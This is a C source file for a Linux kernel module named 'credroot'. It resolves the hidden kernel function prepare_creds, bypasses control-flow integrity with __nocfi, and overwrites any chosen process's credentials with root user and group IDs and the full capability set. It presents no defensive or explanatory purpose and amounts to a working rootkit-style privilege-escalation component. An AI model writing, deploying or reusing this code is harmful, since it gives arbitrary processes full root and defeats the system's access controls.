// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/rcupdate.h>
#include <linux/capability.h>

#include "hk.h"
#include "credroot.h"

static struct cred *(*cr_prepare_creds)(void);

static __nocfi struct cred *cr_call_prepare(void)
{
	return cr_prepare_creds();
}

int credroot_init(void)
{
	unsigned long addr;

	addr = hk_resolve("prepare_creds");
	if (!addr)
		return -ENODATA;
	cr_prepare_creds = (struct cred *(*)(void))addr;
	return 0;
}

void credroot_exit(void)
{
	cr_prepare_creds = NULL;
}

static void credroot_full_creds(struct cred *c)
{
	c->uid = c->suid = c->euid = c->fsuid = GLOBAL_ROOT_UID;
	c->gid = c->sgid = c->egid = c->fsgid = GLOBAL_ROOT_GID;
	c->cap_inheritable = CAP_FULL_SET;
	c->cap_permitted = CAP_FULL_SET;
	c->cap_effective = CAP_FULL_SET;
	c->cap_bset = CAP_FULL_SET;
	c->cap_ambient = CAP_FULL_SET;
}

int credroot_mark_root(pid_t pid)
{
	struct pid *pid_struct;
	struct task_struct *task;
	struct cred *new_cred;

	if (!cr_prepare_creds)
		return -ENODATA;

	pid_struct = find_get_pid(pid);
	if (!pid_struct)
		return -ESRCH;
	task = get_pid_task(pid_struct, PIDTYPE_PID);
	put_pid(pid_struct);
	if (!task)
		return -ESRCH;

	new_cred = cr_call_prepare();
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}

	credroot_full_creds(new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	put_task_struct(task);
	return 0;
}

int credroot_mark_current(void)
{
	return credroot_mark_root(task_pid_nr(current));
}
